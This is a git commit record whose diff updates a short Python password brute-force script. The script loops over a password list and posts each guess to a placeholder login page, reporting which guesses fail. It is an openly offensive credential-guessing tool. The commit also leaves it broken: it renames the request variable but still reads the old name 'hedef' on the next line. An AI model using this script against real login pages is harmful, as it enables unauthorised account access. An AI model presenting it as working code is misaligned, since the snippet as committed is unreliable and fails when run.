fa45be02f7f9aea8cc88ea9606969e9daf4ab444
mberkgökmen <89872172+mberkgokmen@users.noreply.github.com>
2022-03-24 21:57:43 +0300

    Update bruteforce.py

--- bruteforce.py
+++ bruteforce.py
@@ -4,7 +4,7 @@ with open("password.txt") as passwords:
     for password in passwords:
         password = password.replace("\n", "")
         payload = {'username' : '< Here is for username >', 'password': password}
-        hedef = requests.post("<Login page Url>", data=payload)
+        website = requests.post("<Login page Url>", data=payload)
         if "Your name or password is wrong. " in hedef.text: # You can change this according to website 
             print(" Wrong Password: " + password)
         else: 
